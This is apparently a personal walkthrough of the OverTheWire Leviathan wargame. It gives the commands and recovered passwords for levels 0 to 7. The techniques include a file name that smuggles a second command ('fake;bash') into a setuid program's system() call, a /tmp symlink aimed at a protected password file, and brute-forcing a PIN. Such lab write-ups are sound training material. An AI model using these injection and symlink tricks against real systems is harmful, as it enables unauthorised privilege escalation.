# [Leviathan](htt**pass:**//overthewire.org/wargames/leviathan/)

For every level `ssh leviathan[level]@leviathan.labs.overthewire.org -p 2223`

## Leviathan 0

**user:** *leviathan0*  
**pass:** *leviathan0*

`ls -lash`  
`cd .backup`  
`cat bookmarks.html|grep pass`

Password for *leviathan1*: **rioGegei8m**

## Leviathan 1

**user:** *leviathan1*  
**pass:** *rioGegei8m*

`ls -lash`

There is a setuid binary called `check`. Running it prompts for a password.

`hexdump -C check`

We see four plaintext words 'sex','secret','god','love'
We try each of those as the password and 'sex' successfully drops us into a bash shell.

`cat /etc/leviathan_pass/leviathan2`

Password for *leviathan2*: **ougahZi8Ta**

## Leviathan 2

**user:** *leviathan2*  
**pass:** *ougahZi8Ta*

There is a setuid binary called 'printfile'. Running it shows that it prints any file as leviathan3.

`./printfile /etc/leviathan_pass/leviathan3`

Crap... apparently we "can't have that file...". So we can assume there is some sort of filtering going on. Lets take a look at what the code is actually doing.

`ltrace ./printfile .bashrc`

> __libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...>  
> access(".bashrc", 4)                                          = 0  
> snprintf("/bin/cat .bashrc", 511, "/bin/cat %s", ".bashrc")   = 16  
> geteuid()                                                     = 12002  
> geteuid()                                                     = 12002  
> setreuid(12002, 12002)                                        = 0  
> system("/bin/cat .bashrc"

So we see it just takes our argument and supplies it to `/bin/cat`.
It doesnt do any sanitation on the filename so as long as we have access to it. We can have a file named whatever we want. In this case, we want a filename that executes another command upon evaluation by the above code.

`mkdir /tmp/jdh0`  
`touch "/tmp/jdh0/fake;bash"`

Now if we run this file through the binary, it will make the `system()` call "/bin/cat fake;bash" which should give us a shell as leviathan3.

`./printfile "/tmp/jdh0/fake;bash"`
`whoami`

And voila! We are now in a bash shell as *leviathan3*.

`cat /etc/leviathan_pass/leviathan3`

Password for *leviathan3*: **Ahdiemoo1j**

## Leviathan 3

**user:** *leviathan3*  
**pass:** *Ahdiemoo1j*

`ls -lash`

We see another setuid binary called "level3". When we run it, we get a password prompt. Lets see what its doing.

`ltrace ./## Leviathan3`

> __libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>  
> strcmp("h0no33", "kakaka")                                    = -1  
> printf("Enter the password> ")                                = 20  
> fgets(Enter the password> abc                                        
> "abc\n", 256, 0xf7fc55a0)                               = 0xffffd590  
> strcmp("abc\n", "snlprintf\n")                                = -1  
> puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG  
> )                                    = 19  
> +++ exited (status 0) +++  

It does a random string comparison that will always return false...useless.
Then it prompts for the password.
Then it compares what we provide with the string "snlprintf\n"
So if I am reading this correctly, we just have to type in "snlprintf" as the password?
And yep, we got a shell for leviathan4.

`cat /etc/leviathan_pass/leviathan4`

Password for *leviathan4*: **vuH0coox6m**

## Leviathan 4

**user:** *leviathan4*  
**pass:** *vuH0coox6m*

`ls -lash`

We see a hidden directory ".trash"

`ls -lash .trash`

We see a setuid binary called "bin"

`.trash/bin`

This just prints out a bunch of binary. I bet if we convert it to ascii, it will be the password. Just copy that binary into an online binary to ascii converter and voila!

Password for *leviathan5*: **Tith4cokei**

## Leviathan 5

**user:** *leviathan5*  
**pass:** *Tith4cokei*

`ls -lash`

There is yet another setuid binary called "leviathan5". Running it produces the output "Cannot find /tmp/file.log". So it is looking for that file and presumably printing it out. What if we just tried to symbolically link a file called "/tmp/file.log" to "/etc/leviathan_pass/leviathan6"

`ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log`

No errors. So it might have worked!

`./leviathan5`

And there it is!

Password for *leviathan6*: **UgaoFee4li**

## Leviathan 6

**user:** *leviathan6*  
**pass:** *UgaoFee4li*

`ls -lash`

There is, you guessed it, another setuid binary called "leviathan6". When we run it, we see that it is looking for a 4-digit code. Possibly a pin number to give us the password. There are 10,000 possibilities so lets just brute force it yea?

`for i in {0000..9999}; do ./leviathan6 $i;done`

We wait for this to run and sure enough we get a shell.

`cat /etc/leviathan_pass/leviathan7`

Password for *leviathan7*: **ahy7MaeBo9**

## Leviathan 7

**user:** *leviathan7*  
**pass:** *ahy7MaeBo9*

`ls -lash`

And we see CONGRATULATIONS because we have completed Leviathan! Simple and fun!
